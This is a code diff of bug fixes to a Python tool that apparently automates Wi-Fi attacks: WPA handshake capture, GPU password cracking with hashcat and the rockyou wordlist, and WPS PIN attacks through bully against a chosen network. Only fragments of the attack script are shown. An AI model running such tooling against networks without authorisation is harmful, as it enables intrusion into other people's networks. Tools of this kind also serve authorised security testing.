@@ -132,9 +132,9 @@ def elevate():
         REAL_GROUP = subprocess.run(
             ["id", "-gn", REAL_USER], capture_output=True, text=True
         ).stdout.strip()
-        REAL_UID = subprocess.run(
+        REAL_UID = int(subprocess.run(
             ["id", "-u", REAL_USER], capture_output=True, text=True
-        ).stdout.strip()
+        ).stdout.strip())
         return
 
     log_info("Elevating permissions to root (required for hardware access)...")
@@ -265,7 +265,7 @@ def cleanup():
             capture_output=True,
         )
 
-    if subprocess.run(["pgrep", "-x", "hashcat"]).returncode == 0:
+    if subprocess.run(["pgrep", "-x", "hashcat"], capture_output=True).returncode == 0:
         log_info("Sending SIGINT to hashcat (saving session checkpoint)...")
         subprocess.run(["pkill", "-SIGINT", "-x", "hashcat"], capture_output=True)
         time.sleep(2)
@@ -333,7 +333,6 @@ def check_deps():
         "aircrack-ng": "aircrack-ng",
         "bully": "bully",
         "wash": "reaver",
-        "gawk": "gawk",
         "lspci": "pciutils",
         "timeout": "coreutils",
         "iw": "iw",
@@ -800,7 +799,7 @@ def prepare_wordlist(attack_type):
                 log_info("Decompressing rockyou.txt.gz...")
                 dest = os.path.join(TMP_DIR, "rockyou.txt")
                 try:
-                    with open(dest, "w", newline="") as out:
+                    with open(dest, "wb") as out:
                         subprocess.run(["zcat", rockyou_path], stdout=out, check=True)
                     final_wordlist = dest
                 except Exception:
@@ -894,7 +893,7 @@ def probe_gpu():
     log_gpu("Probing GPU hardware...")
 
     if not shutil.which("nvidia-smi"):
-        log_warn("nvidia-smi not found — NVIDIA driver may not be loaded.")
+        log_warn("nvidia-smi not found - NVIDIA driver may not be loaded.")
         log_warn("GPU cracking unavailable; hashcat will fall back to CPU/OpenCL mode.")
         gpu_available = 0
         return
@@ -1286,7 +1285,7 @@ def parse_and_display_result():
         line = fh.readline()
         idx = line.find(":")
         if idx > 0:
-            cracked_key = line[idx + 1:].strip()
+            cracked_key = line[idx + 1:].rstrip("\r\n")
 
     if not cracked_key:
         log_warn("Could not parse passphrase from potfile.")
@@ -1301,7 +1300,7 @@ def parse_and_display_result():
 
     console.print()
     console.print("[bold green]+--------------------------------+[/bold green]")
-    console.print("[bold green]|       PASSWORD CRACKed !!!       |[/bold green]")
+    console.print("[bold green]|      PASSWORD CRACKED !!!      |[/bold green]")
     console.print("[bold green]+--------------------------------+[/bold green]")
     console.print()
     console.print(f"[bold cyan]Network   :[/bold cyan] {target_essid}")
@@ -1370,6 +1369,7 @@ def start_recorder(capture_base):
 # ATTACK: WPA HANDSHAKE CAPTURE + GPU CRACK
 # -----------------------------------------------------------------------------
 def attack_wpa_handshake_gpu():
+    global hc22000_file, hashcat_potfile
     attack_vector = select_attack_vector()
     log_info(f"Attack vector selected: {attack_vector}")
 
@@ -1530,7 +1530,6 @@ def attack_wpa_handshake_gpu():
                 return 0
             continue
 
-        global hc22000_file, hashcat_potfile
         while True:
             console.print()
             log_info("Step 3: GPU Compute Pipeline")
@@ -1600,17 +1599,18 @@ def attack_wps():
         capture_output=True, text=True,
     )
     for line in result.stdout.splitlines():
-        if target_bssid in line:
+        if target_bssid.upper() in line.upper():
             console.print(line)
     log_info("Attempting WPS attack via 'bully'...")
     log_warn("This may take a very long time. Press Ctrl+C to abort.")
     try:
-        subprocess.run(
+        result = subprocess.run(
             ["bully", "-b", target_bssid, "-c", str(target_ch), "-v", "3", "--", mon_iface]
         )
+        if result.returncode != 0:
+            log_warn("Bully exited with a non-zero status.")
     except KeyboardInterrupt:
-        pass
-    log_warn("Bully exited with error or was interrupted.")
+        log_warn("Bully was interrupted by user.")
 
 
 # -----------------------------------------------------------------------------
